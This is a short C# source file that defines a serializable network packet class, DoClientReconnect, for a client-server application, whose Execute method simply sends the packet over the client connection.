using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoClientReconnect : IPacket
    {
        public DoClientReconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}